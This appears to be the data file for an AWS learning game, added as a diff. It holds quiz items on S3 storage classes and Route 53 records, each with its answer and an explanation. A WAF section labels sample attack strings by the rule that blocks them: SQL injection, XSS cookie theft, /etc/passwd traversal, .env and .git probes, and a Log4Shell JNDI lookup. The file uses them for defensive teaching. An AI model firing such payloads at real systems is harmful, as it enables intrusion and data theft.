@@ -1,0 +1,713 @@
+{
+  "source": "Hand-written to AWS's own docs: S3 storage classes and their minimums (S3 pricing and user guide), Route 53 record types and routing policies (Route 53 developer guide), AWS WAF managed rule groups and rate-based rules (AWS WAF developer guide). Tiers: 1 first plays, 2 after a couple of plays, 3 for regulars.",
+  "asOf": "2026-10-11",
+  "fishing": [
+    {
+      "name": "profile-pic.jpg",
+      "hint": "Shown on every page load",
+      "answer": "standard",
+      "why": "Read constantly → S3 Standard: no retrieval fees, millisecond access.",
+      "tier": 1
+    },
+    {
+      "name": "app-bundle.js",
+      "hint": "Downloaded by every visitor",
+      "answer": "standard",
+      "why": "Hot data → Standard. Tip: put CloudFront in front of it.",
+      "tier": 1
+    },
+    {
+      "name": "thumbnail-42.png",
+      "hint": "Loaded thousands of times a day",
+      "answer": "standard",
+      "why": "Frequent reads make Standard cheapest overall.",
+      "tier": 1
+    },
+    {
+      "name": "logo.svg",
+      "hint": "On every page of the shop",
+      "answer": "standard",
+      "why": "Read all day → Standard (and cache it at the edge with CloudFront).",
+      "tier": 1
+    },
+    {
+      "name": "today-orders.csv",
+      "hint": "Read by the dashboard every few minutes",
+      "answer": "standard",
+      "why": "Hot and changing → Standard.",
+      "tier": 1
+    },
+    {
+      "name": "tax-return-2015.pdf",
+      "hint": "Must keep it, will never open it",
+      "answer": "glacier",
+      "why": "Cold archive → Glacier (Deep Archive is even cheaper).",
+      "tier": 1
+    },
+    {
+      "name": "audit-logs-2019.zip",
+      "hint": "Kept 7 years for compliance, never read",
+      "answer": "glacier",
+      "why": "Archive → Glacier. For files kept years and never read, Glacier Deep Archive is cheapest, and waiting hours to restore is fine.",
+      "tier": 1
+    },
+    {
+      "name": "old-emails-2012.mbox",
+      "hint": "Kept for legal reasons only",
+      "answer": "glacier",
+      "why": "Kept but never read → an archive class: Glacier.",
+      "tier": 1
+    },
+    {
+      "name": "invoice-2023.pdf",
+      "hint": "Opened about once a month",
+      "answer": "ia",
+      "why": "Infrequent but must open instantly → Standard-IA: cheaper storage, small fee per GB you read.",
+      "tier": 1
+    },
+    {
+      "name": "quarterly-report.xlsx",
+      "hint": "Checked a few times per quarter",
+      "answer": "ia",
+      "why": "Warm data → Standard-IA: a lower storage price, plus a small fee per GB you read back.",
+      "tier": 1
+    },
+    {
+      "name": "db-backup.sql.gz",
+      "hint": "Restored only in emergencies, needs to be quick",
+      "answer": "ia",
+      "why": "A backup that must restore fast → Standard-IA: millisecond reads, 30-day minimum. Glacier Instant Retrieval is also instant and cheaper to store, but bills at least 90 days per object.",
+      "tier": 2
+    },
+    {
+      "name": "raw-footage-2018.mov",
+      "hint": "Old project, kept just in case",
+      "answer": "glacier",
+      "why": "Rarely if ever touched → Glacier. Use a lifecycle rule to move it automatically.",
+      "tier": 2
+    },
+    {
+      "name": "dr-site-backup.tar",
+      "hint": "Needed fast if the main site fails, otherwise untouched",
+      "answer": "ia",
+      "why": "Rarely read but must be ready in seconds → Standard-IA, not an archive that takes hours.",
+      "tier": 2
+    },
+    {
+      "name": "last-month-logs.gz",
+      "hint": "Searched when something breaks, a few times a month",
+      "answer": "ia",
+      "why": "Read now and then, must open at once → Standard-IA.",
+      "tier": 2
+    },
+    {
+      "name": "course-video-week1.mp4",
+      "hint": "Every new student watches it",
+      "answer": "standard",
+      "why": "Streamed constantly → Standard, with CloudFront in front.",
+      "tier": 2
+    },
+    {
+      "name": "research-dataset-2016.parquet",
+      "hint": "Finished study, kept for reproducibility",
+      "answer": "glacier",
+      "why": "Kept for years, rarely if ever read → Glacier.",
+      "tier": 2
+    },
+    {
+      "name": "monthly-statement-archive.zip",
+      "hint": "Customers download last year's statements now and then",
+      "answer": "ia",
+      "why": "Occasional reads that must be instant → Standard-IA.",
+      "tier": 2
+    },
+    {
+      "name": "feature-flags.json",
+      "hint": "Read by every server on start-up, many times an hour",
+      "answer": "standard",
+      "why": "Small and read all the time → Standard. Per-request fees matter more than storage here.",
+      "tier": 2
+    },
+    {
+      "name": "ct-scans-2010.dcm",
+      "hint": "Hospital must keep them 15 years, almost never opened",
+      "answer": "glacier",
+      "why": "Long retention, rare access, hours to restore is acceptable → Glacier (Deep Archive is cheapest).",
+      "tier": 2
+    },
+    {
+      "name": "photo-contest-entries-2022.zip",
+      "hint": "Judged and finished; maybe reused in a yearbook",
+      "answer": "glacier",
+      "why": "Done with, kept just in case → Glacier.",
+      "tier": 2
+    },
+    {
+      "name": "tiny-config-2kb.yml",
+      "hint": "Opened once a month, only 2 KB",
+      "answer": "standard",
+      "why": "A trick: Standard-IA bills every object as at least 128 KB, so a tiny file can cost more there. Standard is cheaper for very small objects.",
+      "tier": 3
+    },
+    {
+      "name": "temp-upload-chunk.part",
+      "hint": "Deleted within a day",
+      "answer": "standard",
+      "why": "Standard-IA bills 30 days minimum and Glacier 90, so short-lived files belong in Standard.",
+      "tier": 3
+    },
+    {
+      "name": "legal-hold-contract.pdf",
+      "hint": "Never opened, but a lawyer might need it within minutes",
+      "answer": "ia",
+      "why": "Must be readable at once when needed → not an archive that takes hours. Standard-IA (or Glacier Instant Retrieval) fits.",
+      "tier": 3
+    },
+    {
+      "name": "user-avatar-inactive.png",
+      "hint": "Belongs to an account nobody has used for two years",
+      "answer": "ia",
+      "why": "Cold, but the user might log in tomorrow and expect it instantly → Standard-IA.",
+      "tier": 3
+    },
+    {
+      "name": "nightly-build-artifact.tar",
+      "hint": "Kept 7 days, then deleted",
+      "answer": "standard",
+      "why": "Deleted before 30 days → Standard; IA and Glacier charge minimum storage periods.",
+      "tier": 3
+    },
+    {
+      "name": "music-master-1999.wav",
+      "hint": "Original recording, kept forever, restored maybe once a decade",
+      "answer": "glacier",
+      "why": "The textbook archive → Glacier Deep Archive is the cheapest place in S3.",
+      "tier": 3
+    },
+    {
+      "name": "game-patch-v2.1.bin",
+      "hint": "Everyone downloads it this week, nobody after",
+      "answer": "standard",
+      "why": "Hot now → Standard; add a lifecycle rule to move it to Standard-IA later.",
+      "tier": 3
+    },
+    {
+      "name": "annual-report-2024.pdf",
+      "hint": "Popular in March, quiet the rest of the year",
+      "answer": "ia",
+      "why": "Mostly quiet with bursts → Standard-IA works; S3 Intelligent-Tiering would move it for you automatically.",
+      "tier": 3
+    },
+    {
+      "name": "security-camera-week3.mp4",
+      "hint": "Kept 90 days in case of an incident, rarely viewed",
+      "answer": "ia",
+      "why": "Kept a few months and must play at once if needed → Standard-IA.",
+      "tier": 3
+    },
+    {
+      "name": "compliance-ledger-2008.csv",
+      "hint": "Regulator may ask, you can take a day to answer",
+      "answer": "glacier",
+      "why": "Rare access with time to spare → Glacier is far cheaper to keep.",
+      "tier": 3
+    }
+  ],
+  "route53": [
+    {
+      "q": "Point www.example.com at the IPv4 address 203.0.113.10",
+      "options": [
+        "A",
+        "AAAA",
+        "MX",
+        "TXT"
+      ],
+      "answer": "A",
+      "why": "An A record maps a name to an IPv4 address.",
+      "tier": 1
+    },
+    {
+      "q": "Point api.example.com at an IPv6 address",
+      "options": [
+        "A",
+        "AAAA",
+        "CNAME",
+        "MX"
+      ],
+      "answer": "AAAA",
+      "why": "AAAA records hold IPv6 addresses.",
+      "tier": 1
+    },
+    {
+      "q": "Route email for example.com to the mail servers",
+      "options": [
+        "MX",
+        "A",
+        "TXT",
+        "NS"
+      ],
+      "answer": "MX",
+      "why": "MX records say which servers accept mail for a domain.",
+      "tier": 1
+    },
+    {
+      "q": "Publish a plain-text verification string a service gave you",
+      "options": [
+        "TXT",
+        "MX",
+        "AAAA",
+        "A"
+      ],
+      "answer": "TXT",
+      "why": "TXT records hold any text you need, such as verification tokens.",
+      "tier": 1
+    },
+    {
+      "q": "Make blog.example.com another name for myblog.host.net",
+      "options": [
+        "CNAME",
+        "A",
+        "AAAA",
+        "MX"
+      ],
+      "answer": "CNAME",
+      "why": "A CNAME points one name at another name. It can't sit at the zone apex.",
+      "tier": 1
+    },
+    {
+      "q": "Send each user to whichever of your Regions gives them the lowest latency",
+      "options": [
+        "Latency",
+        "Weighted",
+        "Failover",
+        "Simple"
+      ],
+      "answer": "Latency",
+      "why": "Latency-based routing sends users to the Region with the lowest latency for them.",
+      "tier": 1
+    },
+    {
+      "q": "Serve a backup site only when the primary fails its health check",
+      "options": [
+        "Failover",
+        "Weighted",
+        "Simple",
+        "Latency"
+      ],
+      "answer": "Failover",
+      "why": "Failover routing uses health checks to switch to a secondary.",
+      "tier": 1
+    },
+    {
+      "q": "One web server, one address, nothing fancy",
+      "options": [
+        "Simple",
+        "Weighted",
+        "Failover",
+        "Geolocation"
+      ],
+      "answer": "Simple",
+      "why": "Simple routing answers with the record's value. Fine for a single resource.",
+      "tier": 1
+    },
+    {
+      "q": "Canary release: 90% of traffic to v1, 10% to v2",
+      "options": [
+        "Weighted",
+        "Latency",
+        "Geolocation",
+        "Failover"
+      ],
+      "answer": "Weighted",
+      "why": "Weighted routing splits traffic by the weights you assign.",
+      "tier": 1
+    },
+    {
+      "q": "Show German users the German site based on where they are",
+      "options": [
+        "Geolocation",
+        "Latency",
+        "Weighted",
+        "Multivalue"
+      ],
+      "answer": "Geolocation",
+      "why": "Geolocation routing answers based on the user's location (continent, country or US state).",
+      "tier": 1
+    },
+    {
+      "q": "Point the zone apex example.com at a CloudFront distribution",
+      "options": [
+        "Alias",
+        "CNAME",
+        "MX",
+        "TXT"
+      ],
+      "answer": "Alias",
+      "why": "Route 53 alias records can point the apex at AWS resources like CloudFront. A CNAME can't sit at the apex.",
+      "tier": 2
+    },
+    {
+      "q": "Point the apex at an Application Load Balancer",
+      "options": [
+        "Alias",
+        "CNAME",
+        "AAAA",
+        "NS"
+      ],
+      "answer": "Alias",
+      "why": "Alias records point at load balancers by name and follow their changing addresses.",
+      "tier": 2
+    },
+    {
+      "q": "Hand a subdomain over to another team's name servers",
+      "options": [
+        "NS",
+        "CNAME",
+        "MX",
+        "SOA"
+      ],
+      "answer": "NS",
+      "why": "NS records delegate a (sub)domain to the name servers that answer for it.",
+      "tier": 2
+    },
+    {
+      "q": "Allow only Amazon's certificate authority to issue certificates for your domain",
+      "options": [
+        "CAA",
+        "TXT",
+        "NS",
+        "PTR"
+      ],
+      "answer": "CAA",
+      "why": "CAA records list which certificate authorities may issue certificates for the domain.",
+      "tier": 2
+    },
+    {
+      "q": "Look up which name belongs to an IP address (reverse DNS)",
+      "options": [
+        "PTR",
+        "A",
+        "CNAME",
+        "SRV"
+      ],
+      "answer": "PTR",
+      "why": "PTR records map an IP address back to a name.",
+      "tier": 2
+    },
+    {
+      "q": "Tell clients the host and port of your voice service",
+      "options": [
+        "SRV",
+        "MX",
+        "A",
+        "TXT"
+      ],
+      "answer": "SRV",
+      "why": "SRV records give a service's host, port, priority and weight.",
+      "tier": 2
+    },
+    {
+      "q": "Return up to eight healthy servers at random, each with a health check",
+      "options": [
+        "Multivalue",
+        "Simple",
+        "Weighted",
+        "Latency"
+      ],
+      "answer": "Multivalue",
+      "why": "Multivalue answer routing returns several healthy records, a simple kind of load spreading.",
+      "tier": 2
+    },
+    {
+      "q": "Names that only resolve inside your VPC",
+      "options": [
+        "Private hosted zone",
+        "Public hosted zone",
+        "Alias",
+        "Geolocation"
+      ],
+      "answer": "Private hosted zone",
+      "why": "A private hosted zone answers only for the VPCs you associate with it.",
+      "tier": 2
+    },
+    {
+      "q": "Add the email-signing records Amazon SES gives you for your domain",
+      "options": [
+        "CNAME",
+        "MX",
+        "PTR",
+        "AAAA"
+      ],
+      "answer": "CNAME",
+      "why": "SES Easy DKIM gives you three CNAME records to publish.",
+      "tier": 2
+    },
+    {
+      "q": "Say which servers may send email for your domain (SPF)",
+      "options": [
+        "TXT",
+        "MX",
+        "CNAME",
+        "CAA"
+      ],
+      "answer": "TXT",
+      "why": "SPF policies are published as TXT records.",
+      "tier": 2
+    },
+    {
+      "q": "Moving to new servers tomorrow: what do you lower today so the switch spreads fast?",
+      "options": [
+        "TTL",
+        "Weight",
+        "MX priority",
+        "NS"
+      ],
+      "answer": "TTL",
+      "why": "A short time to live means resolvers re-ask sooner, so the new address takes over quickly.",
+      "tier": 3
+    },
+    {
+      "q": "Route customers by which network (IP range) they come from",
+      "options": [
+        "IP-based",
+        "Geolocation",
+        "Latency",
+        "Weighted"
+      ],
+      "answer": "IP-based",
+      "why": "IP-based routing answers by the client's IP address range (CIDR blocks you define).",
+      "tier": 3
+    },
+    {
+      "q": "Send more users to a Region by growing its area on the map, with a bias",
+      "options": [
+        "Geoproximity",
+        "Geolocation",
+        "Latency",
+        "Weighted"
+      ],
+      "answer": "Geoproximity",
+      "why": "Geoproximity routing uses where users and resources are, and a bias to grow or shrink a Region's share.",
+      "tier": 3
+    },
+    {
+      "q": "Stop sending traffic to v2 without deleting its record",
+      "options": [
+        "Weight 0",
+        "TTL 0",
+        "Delete NS",
+        "CNAME"
+      ],
+      "answer": "Weight 0",
+      "why": "A weighted record with weight 0 gets no traffic (unless every record is 0).",
+      "tier": 3
+    },
+    {
+      "q": "Which DNS queries does Route 53 not charge for?",
+      "options": [
+        "Alias to AWS resources",
+        "Every CNAME",
+        "All MX",
+        "Health checks"
+      ],
+      "answer": "Alias to AWS resources",
+      "why": "Alias queries to AWS resources like CloudFront, ELB and S3 websites are free.",
+      "tier": 3
+    },
+    {
+      "q": "A record created for you in every hosted zone, naming the main name server",
+      "options": [
+        "SOA",
+        "NS",
+        "TXT",
+        "CAA"
+      ],
+      "answer": "SOA",
+      "why": "Each hosted zone gets an SOA (start of authority) record and NS records automatically.",
+      "tier": 3
+    },
+    {
+      "q": "Failover only works if Route 53 can tell the primary is down. What does it need?",
+      "options": [
+        "Health check",
+        "TTL 0",
+        "CAA",
+        "Alias"
+      ],
+      "answer": "Health check",
+      "why": "Failover routing switches when the primary's health check fails.",
+      "tier": 3
+    },
+    {
+      "q": "Users in a country you didn't list get which answer under geolocation routing?",
+      "options": [
+        "Default record",
+        "No answer",
+        "Nearest country",
+        "Random"
+      ],
+      "answer": "Default record",
+      "why": "Without a default record, users from unlisted places get no answer, so add one.",
+      "tier": 3
+    },
+    {
+      "q": "Send 100% to blue, then shift slowly to green with no new DNS names",
+      "options": [
+        "Weighted",
+        "Failover",
+        "Simple",
+        "Geolocation"
+      ],
+      "answer": "Weighted",
+      "why": "Change the weights step by step: a blue/green rollout.",
+      "tier": 3
+    },
+    {
+      "q": "Keep the apex working when the CloudFront distribution's addresses change",
+      "options": [
+        "Alias",
+        "A with fixed IPs",
+        "CNAME",
+        "TXT"
+      ],
+      "answer": "Alias",
+      "why": "Alias records track the target's current addresses for you.",
+      "tier": 3
+    }
+  ],
+  "shield": {
+    "attacks": [
+      {
+        "label": "' OR 1=1 --",
+        "rule": "sqli",
+        "tier": 1
+      },
+      {
+        "label": "admin'--",
+        "rule": "sqli",
+        "tier": 1
+      },
+      {
+        "label": "UNION SELECT password FROM users",
+        "rule": "sqli",
+        "tier": 2
+      },
+      {
+        "label": "1; DROP TABLE orders",
+        "rule": "sqli",
+        "tier": 2
+      },
+      {
+        "label": "id=1 AND SLEEP(5)",
+        "rule": "sqli",
+        "tier": 3
+      },
+      {
+        "label": "<script>alert(1)</script>",
+        "rule": "xss",
+        "tier": 1
+      },
+      {
+        "label": "<img src=x onerror=steal()>",
+        "rule": "xss",
+        "tier": 2
+      },
+      {
+        "label": "javascript:alert(document.cookie)",
+        "rule": "xss",
+        "tier": 3
+      },
+      {
+        "label": "<svg onload=hack()>",
+        "rule": "xss",
+        "tier": 3
+      },
+      {
+        "label": "../../etc/passwd",
+        "rule": "badinput",
+        "tier": 1
+      },
+      {
+        "label": "GET /.env",
+        "rule": "badinput",
+        "tier": 2
+      },
+      {
+        "label": "GET /.git/config",
+        "rule": "badinput",
+        "tier": 2
+      },
+      {
+        "label": "${jndi:ldap://evil}",
+        "rule": "badinput",
+        "tier": 3
+      },
+      {
+        "label": "bad-bot/1.0",
+        "rule": "bot",
+        "tier": 1
+      },
+      {
+        "label": "sqlmap/1.7",
+        "rule": "bot",
+        "tier": 2
+      },
+      {
+        "label": "scraper: /prices ×500",
+        "rule": "bot",
+        "tier": 2
+      },
+      {
+        "label": "masscan/1.3",
+        "rule": "bot",
+        "tier": 3
+      },
+      {
+        "label": "POST /login ×300/min",
+        "rule": "rate",
+        "tier": 2
+      },
+      {
+        "label": "GET /search ×1000/min",
+        "rule": "rate",
+        "tier": 3
+      }
+    ],
+    "good": [
+      "GET /home",
+      "GET /shop?page=2",
+      "POST /cart",
+      "GET /img/logo.png",
+      "GET /api/me",
+      "POST /login",
+      "GET /search?q=red+shoes",
+      "PUT /profile",
+      "GET /help",
+      "GET /orders/1042",
+      "POST /checkout",
+      "GET /blog/aws-tips"
+    ],
+    "rules": {
+      "sqli": {
+        "name": "SQL injection rule",
+        "group": "AWS managed SQL database rule group"
+      },
+      "xss": {
+        "name": "Cross-site scripting rule",
+        "group": "AWS managed core rule set"
+      },
+      "badinput": {
+        "name": "Known bad inputs rule",
+        "group": "AWS managed known bad inputs and core rule sets"
+      },
+      "bot": {
+        "name": "Bot Control",
+        "group": "AWS WAF Bot Control"
+      },
+      "rate": {
+        "name": "Rate-based rule",
+        "group": "a rate-based rule (requests per IP address over a time window)"
+      }
+    }
+  }
+}
